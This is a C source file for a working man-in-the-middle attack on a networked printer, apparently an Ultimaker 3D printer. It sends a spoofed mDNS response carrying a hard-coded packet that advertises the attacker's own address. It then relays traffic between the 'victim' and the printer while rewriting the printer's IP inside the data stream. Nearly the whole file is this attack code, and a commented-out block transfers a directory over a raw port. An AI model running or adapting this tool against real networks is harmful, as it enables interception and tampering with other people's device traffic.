#include "../netreach_unix.h"
#include "../parse.h"
#include "../world.h"

#define DEFAULTPORT 80
#define DEFAULTPRINTERIP "192.168.8.180"

#define MAXHTTPLEN 8192

#define MITM_IFACE_HANDLING_VICTIM  "wlx00e04c0bf87d" // "wls34u2"
#define MITM_IFACE_HANDLING_PRINTER "wlx00259cfc616c"

Bytes* changesrcip(Bytes* origin, Bytes* printerip, char* interface)
{
	Bytes* ip4str = getip(interface, STRING, IPV4); // Get attacker's current ip from interface defined by 'interface'
	char* found = substr_loc(printerip, origin);
	while (found)
	{
		origin = insertbytes(&ip4str, &origin, found, parse_ipv4, NOFREEOLD); 		// Insert attacker ip and erases original ip from string (frees 'ip4str')
		found = substr_loc(printerip, origin);	
	}
	free_bytes(&ip4str);	// Memory cleaning
	return origin;
}

Bytes* listen_for_outreach()
{
	// (1) listen to SSDP broadcast, (2) extract port from request, and (3) send response
	// FIRST
	// source started from: http://www.cs.tau.ac.il/~eddiea/samples/Multicast/multicast-listen.c.html
	int send_s, recv_s;     /* Sockets for sending and receiving. */
	u_int yes = 1;
	struct ip_mreq mreq;
	struct sockaddr_in mcast_group;
	struct sockaddr_in from;
	zeroarray((char*)(&mcast_group), sizeof(mcast_group));
	mcast_group.sin_family = AF_INET;
	mcast_group.sin_port = htons(5353);
	mcast_group.sin_addr.s_addr = inet_addr("224.0.0.251");

	if ( (recv_s=socket(AF_INET, SOCK_DGRAM, 0)) < 0)
	{
		perror ("recv socket");
		exit(1);
	}

	if (setsockopt(recv_s, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes)) < 0) 
	{
		perror("reuseaddr setsockopt");
		exit(1);
	}

	if (bind(recv_s, (struct sockaddr*)&mcast_group, sizeof(mcast_group)) < 0) 
	{
		perror ("bind");
		exit(1);
	}

	/* Preparations for using Multicast */
	mreq.imr_multiaddr = mcast_group.sin_addr;
	mreq.imr_interface.s_addr = htonl(INADDR_ANY);

	/* Tell the kernel we want to join that multicast group. */
	if (setsockopt(recv_s, IPPROTO_IP, IP_ADD_MEMBERSHIP, &mreq, sizeof(mreq)) < 0) 
	{
		perror ("add_membership setsockopt");
		exit(1);
	}
	
		Bytes* ip6 = getip(MITM_IFACE_HANDLING_VICTIM, RAW, IPV6);
		Bytes* ip4 = getip(MITM_IFACE_HANDLING_VICTIM, RAW, IPV4);
	
		Bytes* bytemsg    =    dynamic_bytes(   "\x00\x00\x84\x00\x00\x00"
		"\x00\x05\x00\x00\x00\x00\x0a\x5f\x75\x6c\x74\x69\x6d\x61\x6b\x65"
		"\x72\x04\x5f\x74\x63\x70\x05\x6c\x6f\x63\x61\x6c\x00\x00\x0c\x00"
		"\x01\x00\x00\x11\x94\x00\x1f\x1c\x75\x6c\x74\x69\x6d\x61\x6b\x65"
		"\x72\x73\x79\x73\x74\x65\x6d\x2d\x30\x30\x33\x30\x64\x36\x32\x34"
		"\x35\x38\x64\x38\xc0\x0c\xc0\x2d\x00\x10\x80\x01\x00\x00\x11\x94"
		"\x00\xb6\x0e\x63\x6c\x75\x73\x74\x65\x72\x5f\x73\x69\x7a\x65\x3d"
		"\x31\x0d\x6e\x61\x6d\x65\x3d\x63\x6f\x72\x64\x65\x6c\x69\x61\x0c"
		"\x74\x79\x70\x65\x3d\x70\x72\x69\x6e\x74\x65\x72\x10\x6d\x61\x63"
		"\x68\x69\x6e\x65\x3d\x32\x31\x33\x34\x38\x32\x2e\x32\x16\x66\x69"
		"\x72\x6d\x77\x61\x72\x65\x5f\x76\x65\x72\x73\x69\x6f\x6e\x3d\x36"
		"\x2e\x35\x2e\x31\x14\x68\x6f\x74\x65\x6e\x64\x5f\x74\x79\x70\x65"
		"\x5f\x30\x3d\x41\x41\x20\x30\x2e\x34\x1c\x68\x6f\x74\x65\x6e\x64"
		"\x5f\x73\x65\x72\x69\x61\x6c\x5f\x30\x3d\x36\x33\x65\x64\x63\x33"
		"\x33\x35\x30\x30\x30\x30\x14\x68\x6f\x74\x65\x6e\x64\x5f\x74\x79"
		"\x70\x65\x5f\x31\x3d\x42\x42\x20\x30\x2e\x34\x1c\x68\x6f\x74\x65"
		"\x6e\x64\x5f\x73\x65\x72\x69\x61\x6c\x5f\x31\x3d\x37\x38\x33\x34"
		"\x63\x34\x33\x35\x30\x30\x30\x30\xc0\x2d\x00\x21\x80\x01\x00\x00"
		"\x00\x78\x00\x25\x00\x00\x00\x00\x00\x50\x1c\x75\x6c\x74\x69\x6d"
		"\x61\x6b\x65\x72\x73\x79\x73\x74\x65\x6d\x2d\x30\x30\x33\x30\x64"
		"\x36\x32\x34\x35\x38\x64\x38\xc0\x1c\xc1\x20\x00\x1c\x80\x01\x00"
		"\x00\x00\x78\x00\x10\xfe\x80\x00\x00\x00\x00\x00\x00\x02\x0e\x8e"
		"\xff\xfe\x96\xef\x95\xc1\x20\x00\x01\x80\x01\x00\x00\x00\x78\x00"
		"\x04\xc0\xa8\x08\xb4", 363); // 363 is # of bytes in mdns_response

		replacebytes(bytemsg, ip6, 32, LEFT);	// Place IPv6 address in correct position in MDNS packet
		replacebytes(bytemsg, ip4, 4,  LEFT);	// Place IPv4 address in correct position in MDNS packet
	
		printf("[INFO] Listening for multicast\n");
		int n;
		char message [1024];
		socklen_t len = sizeof(from);
		if ( (n=recvfrom(recv_s, message, 1024, 0,
						(struct sockaddr*)&from, &len)) < 0) 
		{
			perror ("recv");
			exit(1);
		}
		int target_port = from.sin_port;
		printf("Received message from %s, size=%d and target_port: %d!!\n",
				inet_ntoa(from.sin_addr), n, ntohs(target_port));

		int sockfd;
		struct sockaddr_in     servaddr;

		// Creating socket file descriptor
		if ( (sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0 ) {
			perror("socket creation failed");
			exit(EXIT_FAILURE);
		}

		if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes)) < 0) 
		{
			perror("reuseaddr setsockopt");
			exit(1);
		}

		zeroarray((char*)(&servaddr), sizeof(servaddr));

		// Filling server information
		servaddr.sin_family = AF_INET;
		servaddr.sin_port = target_port;
		servaddr.sin_addr.s_addr = inet_addr("224.0.0.251"); //inet_ntoa(from.sin_addr));

		/* Send the message in buf to the server */
		if (sendto(sockfd, bytemsg->array, bytemsg->len, 0, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) 
		{
			perror("sendto()");
			exit(3);
		}

		int loop = 0;
		while (loop++ < 100000000);
		
		if (sendto(sockfd, bytemsg->array, bytemsg->len, 0, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) 
		{
			perror("sendto()");
			exit(4);
		}
	
	cleanup:
		close(sockfd);
		close(recv_s);
		free_bytes(&bytemsg);
		free_bytes(&ip4);
		free_bytes(&ip6);
	char* holdip = inet_ntoa(from.sin_addr);
	return dynamic_bytes(holdip, countuntilnul(holdip));
}

int main()
{
	Bytes* printerip   = userstring("Input Printer IP Address : ");	  		 // Initializing printer ip --> MUST BE CORRECTLY INPUT (e.g. 192.168.8.180)
	Bytes* printerport = userstring("Input port that printer has open: ");	  	 // Initializing printer port
	Bytes* victimport  = userstring("Input port victim connects to on this host: "); // Initializing victim port
	Bytes* victimip    = listen_for_outreach();			 		 // Initializing victim ip
	
	int printer_port_to_use; // Declaring printer port (string to integer value)
	int victim_port_to_use;  // Declaring victim port (string to integer value)

	if (!printerip)							  // If no printer ip provided
		printerip = dynamic_bytes(DEFAULTPRINTERIP, countuntilnul(DEFAULTPRINTERIP));   // Initializing printer ip to "192.168.8.180"
	if (!printerport)					  	  // If bad or no port specified for printer
		printer_port_to_use = DEFAULTPORT;			  // Initializing printer port to 80
	else
		printer_port_to_use = atoi(printerport->array);		  // Initializing printer port (string to integer value)
	if (!victimport)					 	  // If bad or no port specified for victim
		victim_port_to_use  = DEFAULTPORT;			  // Initializing victim port to 80
	else
		victim_port_to_use  = atoi(victimport->array);		  // Initializing victim port (string to integer value)

	Bytes* tmp_hold1 = getip(MITM_IFACE_HANDLING_VICTIM, STRING, IPV4);
	Bytes* tmp_hold2 = getip(MITM_IFACE_HANDLING_PRINTER, STRING, IPV4);

	Portal* victimstream  = portalize(NULLPTR, tmp_hold1->array, victim_port_to_use, PERCEIVER, NOENCRYPT);			// Set up connection to victim
	Portal* printerstream = portalize(printerip->array, tmp_hold2->array, printer_port_to_use, INCEIVER, NOENCRYPT);	// Set up connection to printer
	free_bytes(&tmp_hold1);
	free_bytes(&tmp_hold2);
	PRINT("starting");
	char hold = 1;
	register int recvamt;
	Bytes* busdriver = NULLPTR;	// Holds copy of data to be sent to either party
	while (hold)			// While both connections are active (same effect as middle if-statement but for "second:" label)
	{
		recvamt = 0;		// Initialize
		first:
			recvamt = blindrecv(victimstream, 1);		// Receive data from victim up to MAXHTTPLEN bytes
			if (!recvamt)
				goto second;
			busdriver = copy_bytes(PORTALBUFFER(victimstream));				// Copy bytes from buffer to another object for manipulation purposes
			busdriver = changesrcip(busdriver, printerip, MITM_IFACE_HANDLING_PRINTER);	// Replace victim IP with attacker IP from interface handling printer
			hold = SEND(printerstream, &busdriver, NOFREEOLD);				// Send to printer
			printf("[%s] --> [%s]\n", victimip->array, printerip->array);
			zeroarray(PORTALBUFFER(victimstream)->array, PORTALBUFFER(victimstream)->len);	// Clear portal buffer that receives from victim
			PORTALBUFFER(victimstream)->len = 0;
		
		recvamt = 0;	// Reset receiver amount
		if (!hold)	// If first connection breaks,
			break;	// then close both connections
		
		second:
			recvamt = blindrecv(printerstream, 1);			// Receive data from printer up to MAXHTTPLEN bytes
			if (!recvamt)
				goto first;
			busdriver = copy_bytes(PORTALBUFFER(printerstream));				 // Copy bytes from buffer to another object for manipulation purposes
			busdriver = changesrcip(busdriver, printerip, MITM_IFACE_HANDLING_VICTIM);	 // Replace printer IP with attacker IP from interface handling victim
			hold = SEND(victimstream, &busdriver, NOFREEOLD); 				// Send to victim
			printf("[%s] --> [%s]\n", printerip->array, victimip->array);
			zeroarray(PORTALBUFFER(printerstream)->array, PORTALBUFFER(printerstream)->len); // Clear portal buffer that receives from printer
			PORTALBUFFER(printerstream)->len = 0;
	}
	
	PRINT("Connection severed...cleaning up.");
	
	// Memory Management 101
	
	CLOSE(&printerstream);		// Yep close that 
	CLOSE(&victimstream);		// and that
	free_bytes(&printerip);		// Free this place up (free_bytes is smart enough to avoid freeing any memory not within the heap section of memory e.g. printerip)
	free_bytes(&printerport);	// and this one too
	free_bytes(&victimip);		// this too
	free_bytes(&victimport);	// no memory left behind policy
					// *Note* 'busdriver' is freed by 'SEND()' function (thats why we can reuse the same buffer pointer again and again)
	
	EXIT(HALT);			// *Salute* --> Mission Accomplished ~National Anthem plays with an F22 flyby~
}

// Directory send
/* 

	Bytes* option = userstring("Mode: ");
	Portal* ptr = NULLPTR;
	if (eqstr(option->array, "id"))
	{
		ptr = portalize(IPUSED,  3333, INCEIVER, NOENCRYPT);
		inceptdir(ptr, "/home/castle/Desktop/testdir-captured");
	}
	if (eqstr(option->array, "pd"))
	{
		ptr = portalize(NULLPTR, 3333, PERCEIVER, NOENCRYPT);
		perceptdir(ptr);
	}
*/




// Printer attack
/*

*/
